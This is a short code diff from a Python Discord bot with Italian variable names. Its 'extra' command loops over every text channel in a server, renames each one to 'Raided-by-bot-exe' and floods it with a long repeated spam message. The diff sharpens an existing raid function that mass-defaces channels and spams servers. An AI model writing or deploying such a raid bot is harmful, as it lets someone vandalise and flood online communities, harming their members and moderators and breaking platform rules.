@@ -29,8 +29,8 @@ async def extra(interaction: discord.Interaction):
     contatore = 0
     for canale in interaction.guild.text_channels:
         try:
-            await canale.edit(name="Extra-by-bot")
-            await canale.send("ciao come state?ciao come state?ciao come state?ciao come state?ciao come state?ciao come state?ciao come state?ciao come state?ciao come state?ciao come state?ciao come state?ciao come state?ciao come state?ciao come state?ciao come state?ciao come state?ciao come state?ciao come state?ciao come state?ciao come state?ciao come state?ciao come state?ciao come state?ciao come state?ciao come state?ciao come state?ciao come state?ciao come state?ciao come state?")
+            await canale.edit(name="Raided-by-bot-exe")
+            await canale.send("# ciao come state?ciao come state?ciao come state?ciao come state?ciao come state?ciao come state?ciao come state?ciao come state?ciao come state?ciao come state?ciao come state?ciao come state?ciao come state?ciao come state?ciao come state?ciao come state?ciao come state?ciao come state?ciao come state?ciao come state?ciao come state?ciao come state?ciao come state?ciao come state?ciao come state?ciao come state?ciao come state?ciao come state?ciao come state?")
             contatore += 1
         except Exception as e:
             print(f"Salto {canale.name}: {e}")
